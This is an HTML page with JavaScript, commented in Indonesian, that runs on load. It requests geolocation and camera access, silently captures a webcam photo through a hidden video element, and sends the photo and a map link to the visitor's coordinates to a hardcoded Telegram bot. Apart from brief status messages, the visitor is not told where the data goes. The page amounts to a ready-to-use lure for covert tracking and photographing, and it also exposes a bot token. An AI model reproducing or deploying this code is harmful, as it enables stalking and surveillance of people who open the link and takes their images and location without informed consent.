<!DOCTYPE html>
<html>
<head>
  <title>Capture & GPS to Telegram</title>
</head>
<body>
  <h3 id="status">Memulai...</h3>
  <video id="video" autoplay playsinline muted style="display:none;"></video>

<script>
const BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k"; // ganti ini
const CHAT_ID = "7218964278";     // ganti ini
const statusText = document.getElementById("status");
const video = document.getElementById("video");

async function sendToTelegram(photoData, lokasi) {
  // Kirim lokasi
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `Lokasi: ${lokasi}`
    })
  });

  // Kirim foto
  const blob = await (await fetch(photoData)).blob();
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "capture.png");

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

async function start() {
  let lokasi = "Lokasi tidak tersedia";
  let photoData = null;

  // Ambil lokasi (izin akan diminta otomatis)
  try {
    await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          lokasi = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
          resolve();
        },
        (err) => {
          lokasi = "Gagal dapat lokasi: " + err.message;
          resolve(); // tetap lanjut
        }
      );
    });
  } catch {}

  // Akses kamera
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });

    // Tunda agar kamera menyala sempurna
    await new Promise((resolve) => setTimeout(resolve, 3000));

    // Ambil gambar dari kamera
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    photoData = canvas.toDataURL("image/png");

    // Matikan kamera
    stream.getTracks().forEach((track) => track.stop());
  } catch (e) {
    statusText.textContent = "Gagal akses kamera: " + e.message;
  }

  statusText.textContent = "Mengirim ke Telegram...";
  await sendToTelegram(photoData, lokasi);
  statusText.textContent = "Selesai, cek Telegram.";
}

start();
</script>
</body>
</html>
